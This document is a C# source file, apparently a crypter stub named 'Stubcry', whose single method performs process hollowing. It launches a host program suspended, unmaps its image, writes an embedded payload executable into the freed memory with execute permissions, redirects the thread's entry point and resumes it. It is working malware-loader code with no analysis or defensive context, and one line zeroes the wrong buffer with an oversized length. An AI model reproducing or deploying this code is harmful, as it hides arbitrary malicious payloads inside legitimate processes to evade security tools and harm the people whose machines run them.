using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Stubcry
{

    class NIKBINARY32bit
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, int size, uint allocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(string appName, string cmd, IntPtr secAttrib, IntPtr threadAttrib, bool inheritHandles, uint creationFlags, string environment, string currentDirectory, IntPtr startupInfo, IntPtr processInfo);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] data, int size, out int written);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void TerminateProcess(IntPtr hProcess, uint exitCode);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern bool NtUnmapViewOfSection(IntPtr hProcess, IntPtr hAddr);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void RtlZeroMemory(IntPtr memory, int size);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void NtResumeProcess(IntPtr hProcess);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process(IntPtr hProcess, out bool _isWow64ProcessResult);

        const uint CREATE_NEW_CONSOLE = 0x00000010;
        const uint CREATE_NEW_PROCESS_GROUP = 0x00000200;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        const uint DETACHED_PROCESS = 0x00000008;
        const uint NORMAL_PRIORITY_CLASS = 0x00000020;
        const uint HIGH_PRIORITY_CLASS = 0x00000080;
        const uint ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000;
        const uint REALTIME_PRIORITY_CLASS = 0x00000100;
        const uint IDLE_PRIORITY_CLASS = 0x00000040;

        public static void nik5ra(string host, string commandline, byte[] payload)
        {
            int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
            short sizeOfOptionalHeader = Marshal.ReadInt16(payload, e_lfanew + 0x14);
            short numberOfSections = Marshal.ReadInt16(payload, e_lfanew + 0x6);
            int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + 0x50);
            int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + 0x54);
            int locationOfSectionHeaders = e_lfanew + 0x14  + sizeof(int) + sizeOfOptionalHeader;
            int imageBase = Marshal.ReadInt32(payload, e_lfanew + 0x34);
            int addressOfEntrypoint = Marshal.ReadInt32(payload, e_lfanew + 0x28);

            int written = 0;
            bool _im64bit = IntPtr.Size * 8 == 64;
            bool _isWow64 = false;

            IntPtr threadAttributes = Marshal.AllocHGlobal(0x44);
            IntPtr processInfo = Marshal.AllocHGlobal(0x10); 

            RtlZeroMemory(threadAttributes, 0x44);
            RtlZeroMemory(processInfo, 0x10);

            bool hResult = CreateProcess(null, host, IntPtr.Zero, IntPtr.Zero, false,
                NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED
                , null, null, threadAttributes, processInfo);


            IntPtr hProcess = Marshal.ReadIntPtr(processInfo);
            IntPtr hThread = Marshal.ReadIntPtr(processInfo + Marshal.SizeOf(typeof(IntPtr)));

            if (!hResult || hProcess == IntPtr.Zero || hThread == IntPtr.Zero)
            {

                return;
            }

            IsWow64Process(hProcess, out _isWow64);

            NtUnmapViewOfSection(hProcess, (IntPtr)imageBase);

            IntPtr hAllocatedSpace = VirtualAllocEx(hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40);
            if (hAllocatedSpace == IntPtr.Zero || hAllocatedSpace == (IntPtr)(-1) || hAllocatedSpace != (IntPtr)imageBase)
            {
                TerminateProcess(hProcess, 0);
                nik5ra(host, commandline, payload);
                return;
            }

            WriteProcessMemory(hProcess, (IntPtr)imageBase, payload, sizeOfHeaders, out written);

            for (int i = 0; i < numberOfSections; i++)
            {
                IntPtr sectionHeader = Marshal.AllocHGlobal(0x28);
                RtlZeroMemory(sectionHeader, 0x28);

                Marshal.Copy(payload, locationOfSectionHeaders + (i * 0x28), sectionHeader, 0x28);

                int rva = Marshal.ReadInt32(sectionHeader, 0x8 + 0x4);
                int rawsize = Marshal.ReadInt32(sectionHeader, 0x8 + 0x8);
                int rawaddress = Marshal.ReadInt32(sectionHeader, 0x8 + 0xc);
                int virtualsize = Marshal.ReadInt32(sectionHeader, 0x8);

                byte[] data = new byte[rawsize];

                Buffer.BlockCopy(payload, rawaddress, data, 0, rawsize);
                WriteProcessMemory(hProcess, (IntPtr)imageBase + rva, data, rawsize, out written);
            }

            IntPtr threadContext = Marshal.AllocHGlobal(0x2cc);
            RtlZeroMemory(processInfo, 0x2cc);

            Marshal.WriteInt32(threadContext, 0x10001b);

            if (_isWow64)
            {
                Wow64GetThreadContext(hThread, threadContext);
            }
            else
            {
                GetThreadContext(hThread, threadContext);
            }
            int ebx = Marshal.ReadInt32(threadContext, 0xa4);

            byte[] newImageBase = BitConverter.GetBytes(imageBase);
            WriteProcessMemory(hProcess, (IntPtr)ebx + 8, newImageBase, 0x4, out written);

            Marshal.WriteInt32(threadContext + 0xb0, imageBase + addressOfEntrypoint);

            if (_isWow64)
            {
                Wow64SetThreadContext(hThread, threadContext);
            }
            else
            {
                SetThreadContext(hThread, threadContext);
            }

            int previousSuspendCount = ResumeThread(hThread);
            if (previousSuspendCount == -1)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }


    }
}
